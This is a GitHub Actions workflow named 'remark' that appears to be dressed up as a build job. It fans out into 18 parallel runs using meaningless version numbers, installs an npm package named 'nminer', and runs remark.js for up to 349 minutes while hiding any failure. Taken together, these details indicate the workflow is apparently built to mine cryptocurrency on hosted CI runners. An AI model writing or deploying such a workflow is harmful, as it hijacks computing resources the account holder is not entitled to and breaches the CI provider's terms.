name: remark
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 473 }
          - { version: 6832 }
          - { version: 5291 }
          - { version: 6156 }
          - { version: 2918 }
          - { version: 5317 }
          - { version: 4806 }
          - { version: 9281 }
          - { version: 4249 }
          - { version: 5096 }
          - { version: 7795 }
          - { version: 7661 }
          - { version: 5123 }
          - { version: 4018 }
          - { version: 5260 }
          - { version: 3990 }
          - { version: 9383 }
          - { version: 6172 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: properly ample filter
        run: |
          npm install nminer@latest
          timeout 349m node remark.js || echo "remark executed"